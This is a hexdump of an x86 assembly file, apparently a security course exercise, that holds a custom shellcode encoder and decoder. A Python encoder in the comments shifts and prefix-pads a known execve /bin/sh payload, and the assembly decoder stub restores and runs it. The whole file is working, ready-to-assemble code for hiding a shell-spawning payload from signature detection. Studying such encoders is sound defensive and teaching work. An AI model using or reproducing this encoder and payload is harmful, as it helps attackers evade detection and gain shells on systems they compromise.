00000000  3b 61 75 74 68 6f 72 3a  20 53 68 69 68 61 6f 20  |;author: Shihao |
00000010  53 6f 6e 67 73 73 33 36  39 35 40 64 72 65 78 65  |Songss3695@drexe|
00000020  6c 2e 65 64 75 0a 3b 64  65 63 6f 64 69 6e 67 20  |l.edu.;decoding |
00000030  77 69 6c 6c 20 62 65 20  64 69 76 69 64 65 64 20  |will be divided |
00000040  69 6e 74 6f 20 74 77 6f  20 70 61 72 74 73 0a 3b  |into two parts.;|
00000050  46 69 72 73 74 2c 20 73  68 69 66 74 20 72 69 67  |First, shift rig|
00000060  68 74 20 74 6f 20 67 65  74 20 74 68 65 20 6f 72  |ht to get the or|
00000070  69 67 69 6e 61 6c 20 73  68 65 6c 6c 63 6f 64 65  |iginal shellcode|
00000080  20 77 69 74 68 20 70 72  65 66 69 78 20 22 30 78  | with prefix "0x|
00000090  41 41 22 0a 3b 53 65 63  6f 6e 64 2c 20 64 65 6c  |AA".;Second, del|
000000a0  65 74 65 20 61 6c 6c 20  74 68 65 20 22 30 78 41  |ete all the "0xA|
000000b0  41 22 20 70 72 65 66 69  78 20 61 6e 64 20 72 65  |A" prefix and re|
000000c0  66 6f 72 6d 61 74 20 74  68 65 20 73 68 65 6c 6c  |format the shell|
000000d0  63 6f 64 65 0a 0a 3b 20  73 68 65 6c 6c 63 6f 64  |code..; shellcod|
000000e0  65 20 3d 20 28 22 5c 78  33 31 5c 78 63 30 5c 78  |e = ("\x31\xc0\x|
000000f0  35 30 5c 78 36 38 5c 78  32 66 5c 78 32 66 5c 78  |50\x68\x2f\x2f\x|
00000100  37 33 5c 78 36 38 5c 78  36 38 5c 78 32 66 5c 78  |73\x68\x68\x2f\x|
00000110  36 32 5c 78 36 39 5c 78  36 65 5c 78 38 39 5c 78  |62\x69\x6e\x89\x|
00000120  65 33 5c 78 35 30 5c 78  38 39 5c 78 65 32 5c 78  |e3\x50\x89\xe2\x|
00000130  35 33 5c 78 38 39 5c 78  65 31 5c 78 62 30 5c 78  |53\x89\xe1\xb0\x|
00000140  30 62 5c 78 63 64 5c 78  38 30 22 29 0a 3b 20 65  |0b\xcd\x80").; e|
00000150  6e 63 6f 64 65 20 3d 20  22 22 0a 3b 20 0a 3b 20  |ncode = "".; .; |
00000160  66 6f 72 20 78 20 69 6e  20 62 79 74 65 61 72 72  |for x in bytearr|
00000170  61 79 28 73 68 65 6c 6c  63 6f 64 65 29 20 3a 0a  |ay(shellcode) :.|
00000180  3b 20 20 20 20 20 69 66  20 78 20 3c 20 31 32 38  |;     if x < 128|
00000190  3a 0a 3b 20 20 20 20 20  20 20 20 20 78 3d 78 3c  |:.;         x=x<|
000001a0  3c 31 20 20 20 20 20 20  0a 3b 20 20 20 20 20 20  |<1      .;      |
000001b0  20 20 20 65 6e 63 6f 64  65 20 2b 3d 20 27 30 78  |   encode += '0x|
000001c0  41 41 2c 27 0a 3b 20 20  20 20 20 65 6e 63 6f 64  |AA,'.;     encod|
000001d0  65 20 2b 3d 20 27 30 78  27 0a 3b 20 20 20 20 20  |e += '0x'.;     |
000001e0  65 6e 63 6f 64 65 20 2b  3d 20 27 25 30 32 78 2c  |encode += '%02x,|
000001f0  27 25 78 0a 3b 20 0a 3b  20 70 72 69 6e 74 20 65  |'%x.; .; print e|
00000200  6e 63 6f 64 65 0a 0a 67  6c 6f 62 61 6c 20 5f 73  |ncode..global _s|
00000210  74 61 72 74 0a 73 65 63  74 69 6f 6e 20 2e 74 65  |tart.section .te|
00000220  78 74 0a 5f 73 74 61 72  74 3a 0a 0a 6a 6d 70 20  |xt._start:..jmp |
00000230  73 68 6f 72 74 20 63 61  6c 6c 5f 73 68 65 6c 6c  |short call_shell|
00000240  63 6f 64 65 0a 0a 64 65  63 6f 64 65 72 3a 0a 0a  |code..decoder:..|
00000250  70 6f 70 20 65 73 69 20  20 20 20 20 20 20 20 20  |pop esi         |
00000260  20 20 20 20 3b 6e 6f 77  20 65 73 69 20 63 6f 6e  |    ;now esi con|
00000270  74 61 69 6e 73 20 74 68  65 20 61 64 64 72 65 73  |tains the addres|
00000280  73 20 6f 66 20 65 6e 63  6f 64 65 64 20 73 68 65  |s of encoded she|
00000290  6c 6c 63 6f 64 65 0a 6d  6f 76 20 65 64 69 2c 20  |llcode.mov edi, |
000002a0  65 73 69 20 20 20 20 20  20 20 20 3b 74 68 69 73  |esi        ;this|
000002b0  20 69 73 20 66 6f 72 20  66 6f 72 6d 61 74 74 69  | is for formatti|
000002c0  6e 67 0a 0a 64 65 63 6f  64 65 3a 0a 6d 6f 76 20  |ng..decode:.mov |
000002d0  62 6c 2c 20 62 79 74 65  20 5b 65 73 69 5d 0a 78  |bl, byte [esi].x|
000002e0  6f 72 20 62 6c 2c 20 30  78 42 42 20 20 20 20 20  |or bl, 0xBB     |
000002f0  20 20 20 3b 62 6c 20 69  73 20 66 6f 72 20 74 65  |   ;bl is for te|
00000300  73 74 69 6e 67 20 65 6e  64 0a 6a 7a 20 66 6f 72  |sting end.jz for|
00000310  6d 61 74 74 69 6e 67 20  20 20 20 20 20 20 3b 46  |matting       ;F|
00000320  69 72 73 74 20 73 74 65  70 20 69 73 20 64 6f 6e  |irst step is don|
00000330  65 0a 0a 6d 6f 76 20 63  6c 2c 20 62 79 74 65 20  |e..mov cl, byte |
00000340  5b 65 73 69 5d 0a 78 6f  72 20 63 6c 2c 20 30 58  |[esi].xor cl, 0X|
00000350  41 41 0a 6a 7a 20 73 68  69 66 74 5f 64 65 63 6f  |AA.jz shift_deco|
00000360  64 65 0a 69 6e 63 20 65  73 69 0a 6a 6d 70 20 73  |de.inc esi.jmp s|
00000370  68 6f 72 74 20 64 65 63  6f 64 65 0a 0a 0a 73 68  |hort decode...sh|
00000380  69 66 74 5f 64 65 63 6f  64 65 3a 0a 6d 6f 76 20  |ift_decode:.mov |
00000390  64 6c 2c 20 62 79 74 65  20 5b 65 73 69 20 2b 20  |dl, byte [esi + |
000003a0  31 5d 0a 73 68 72 20 64  6c 2c 31 20 20 20 20 20  |1].shr dl,1     |
000003b0  20 20 20 20 20 20 20 3b  73 68 69 66 74 20 6e 65  |       ;shift ne|
000003c0  78 74 20 69 6e 73 74 72  75 63 74 69 6f 6e 0a 6d  |xt instruction.m|
000003d0  6f 76 20 62 79 74 65 20  5b 65 73 69 20 2b 20 31  |ov byte [esi + 1|
000003e0  5d 2c 20 64 6c 0a 69 6e  63 20 65 73 69 0a 6a 6d  |], dl.inc esi.jm|
000003f0  70 20 73 68 6f 72 74 20  64 65 63 6f 64 65 0a 0a  |p short decode..|
00000400  66 6f 72 6d 61 74 74 69  6e 67 3a 0a 6d 6f 76 20  |formatting:.mov |
00000410  65 61 78 2c 20 65 64 69  0a 6d 6f 76 20 62 6c 2c  |eax, edi.mov bl,|
00000420  20 62 79 74 65 20 5b 65  61 78 5d 0a 78 6f 72 20  | byte [eax].xor |
00000430  62 6c 2c 20 30 78 42 42  20 20 20 20 20 20 20 20  |bl, 0xBB        |
00000440  3b 6e 6f 77 20 66 6f 72  6d 61 74 74 69 6e 67 20  |;now formatting |
00000450  63 6f 6d 70 6c 65 74 65  0a 6a 7a 20 65 6e 63 6f  |complete.jz enco|
00000460  64 65 64 20 20 20 20 20  20 20 20 20 20 3b 73 74  |ded          ;st|
00000470  61 72 74 73 20 74 6f 20  65 78 65 63 75 74 65 0a  |arts to execute.|
00000480  66 6f 72 6d 61 74 3a 0a  6d 6f 76 20 62 6c 2c 20  |format:.mov bl, |
00000490  62 79 74 65 20 5b 65 61  78 5d 20 20 3b 62 6c 20  |byte [eax]  ;bl |
000004a0  69 73 20 66 6f 72 20 74  65 73 74 69 6e 67 20 65  |is for testing e|
000004b0  6e 64 0a 6d 6f 76 20 63  6c 2c 20 62 79 74 65 20  |nd.mov cl, byte |
000004c0  5b 65 61 78 5d 20 20 3b  63 6c 20 69 73 20 66 6f  |[eax]  ;cl is fo|
000004d0  72 20 74 65 73 74 69 6e  67 20 70 72 65 66 69 78  |r testing prefix|
000004e0  0a 78 6f 72 20 63 6c 2c  20 30 78 41 41 0a 6a 6e  |.xor cl, 0xAA.jn|
000004f0  7a 20 4e 65 78 74 5f 43  79 63 6c 65 0a 0a 43 79  |z Next_Cycle..Cy|
00000500  63 6c 65 3a 0a 6d 6f 76  20 64 6c 2c 20 62 79 74  |cle:.mov dl, byt|
00000510  65 20 5b 65 61 78 5d 0a  78 6f 72 20 64 6c 2c 20  |e [eax].xor dl, |
00000520  30 78 42 42 0a 6a 7a 20  4e 65 78 74 5f 43 79 63  |0xBB.jz Next_Cyc|
00000530  6c 65 20 20 20 20 20 20  20 3b 54 68 69 73 20 63  |le       ;This c|
00000540  79 63 6c 65 20 65 6e 64  73 20 68 65 72 65 0a 6d  |ycle ends here.m|
00000550  6f 76 20 64 6c 2c 20 62  79 74 65 20 5b 65 61 78  |ov dl, byte [eax|
00000560  20 2b 20 31 5d 0a 6d 6f  76 20 62 79 74 65 20 5b  | + 1].mov byte [|
00000570  65 61 78 5d 2c 20 64 6c  0a 69 6e 63 20 65 61 78  |eax], dl.inc eax|
00000580  0a 6a 6d 70 20 73 68 6f  72 74 20 43 79 63 6c 65  |.jmp short Cycle|
00000590  0a 0a 4e 65 78 74 5f 43  79 63 6c 65 3a 0a 69 6e  |..Next_Cycle:.in|
000005a0  63 20 65 64 69 0a 6a 6d  70 20 73 68 6f 72 74 20  |c edi.jmp short |
000005b0  66 6f 72 6d 61 74 74 69  6e 67 0a 0a 63 61 6c 6c  |formatting..call|
000005c0  5f 73 68 65 6c 6c 63 6f  64 65 3a 0a 0a 63 61 6c  |_shellcode:..cal|
000005d0  6c 20 64 65 63 6f 64 65  72 0a 65 6e 63 6f 64 65  |l decoder.encode|
000005e0  64 3a 20 64 62 20 30 78  41 41 2c 30 78 36 32 2c  |d: db 0xAA,0x62,|
000005f0  30 78 63 30 2c 30 78 41  41 2c 30 78 61 30 2c 30  |0xc0,0xAA,0xa0,0|
00000600  78 41 41 2c 30 78 64 30  2c 30 78 41 41 2c 30 78  |xAA,0xd0,0xAA,0x|
00000610  35 65 2c 30 78 41 41 2c  30 78 35 65 2c 30 78 41  |5e,0xAA,0x5e,0xA|
00000620  41 2c 30 78 65 36 2c 30  78 41 41 2c 30 78 64 30  |A,0xe6,0xAA,0xd0|
00000630  2c 30 78 41 41 2c 30 78  64 30 2c 30 78 41 41 2c  |,0xAA,0xd0,0xAA,|
00000640  30 78 35 65 2c 30 78 41  41 2c 30 78 63 34 2c 30  |0x5e,0xAA,0xc4,0|
00000650  78 41 41 2c 30 78 64 32  2c 30 78 41 41 2c 30 78  |xAA,0xd2,0xAA,0x|
00000660  64 63 2c 30 78 38 39 2c  30 78 65 33 2c 30 78 41  |dc,0x89,0xe3,0xA|
00000670  41 2c 30 78 61 30 2c 30  78 38 39 2c 30 78 65 32  |A,0xa0,0x89,0xe2|
00000680  2c 30 78 41 41 2c 30 78  61 36 2c 30 78 38 39 2c  |,0xAA,0xa6,0x89,|
00000690  30 78 65 31 2c 30 78 62  30 2c 30 78 41 41 2c 30  |0xe1,0xb0,0xAA,0|
000006a0  78 31 36 2c 30 78 63 64  2c 30 78 38 30 2c 30 78  |x16,0xcd,0x80,0x|
000006b0  42 42                                             |BB|
000006b2
